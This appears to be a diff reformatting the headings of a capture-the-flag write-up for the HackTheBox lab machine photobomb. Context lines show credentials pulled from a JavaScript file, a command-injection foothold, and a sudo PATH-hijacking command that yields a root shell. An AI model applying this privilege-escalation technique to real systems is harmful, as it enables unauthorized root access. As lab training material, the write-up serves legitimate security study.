@@ -3,14 +3,14 @@
 10.10.11.182    photobomb.htb
 ```
 
-# Content
+### Content
 
 - Web Enumeration
 - Source Code analysis found credentials
 - Command Injection
 - Path Hijacking
 
-# Reconnaissance
+### Reconnaissance
 
 Initial reconnaissance for TCP ports
 ```bash
@@ -106,7 +106,7 @@ However we weren't able to go further, no other command was available from here.
 After some basic enumeration we identify some sensitive data in source code on photobomb.js file:
 ![[Pasted image 20230204135739.png]]
 Seems like these are credentials for the /printer endpoint...
-# Exploitation
+### Exploitation
 It seems like a web page that downloads images:
 ![[Pasted image 20230204135851.png]]
 While trying to download an image we intercept this request in Burpsuite:
@@ -124,7 +124,7 @@ wizard@photobomb:~/photobomb$ whoami
 whoami
 wizard
 ```
-# Root privesc
+### Privilege Escalation
 First let's get a [[Fully interactive TTY (Linux)]]  and let's enumerate the machine:
 ```bash
 # Ip of the machine
@@ -192,19 +192,19 @@ wizard@photobomb:~$ /bin/bash -p
 bash-5.0# whoami
 root
 ```
-# Credentials
+### Credentials
 ```bash
 # Access for /printer to be found at /photobomb.js
 pH0t0:b0Mb!
 ```
-# Notes
+### Notes
 
 - Path Hijacking is better to be run on the same command to be executed since exchanging the PATH variable and then run the command does not always work:
 ```bash
 sudo PATH=$PWD:$PATH /opt/cleanup.sh
 ```
 
-# Resources:
+### References
 
 
 
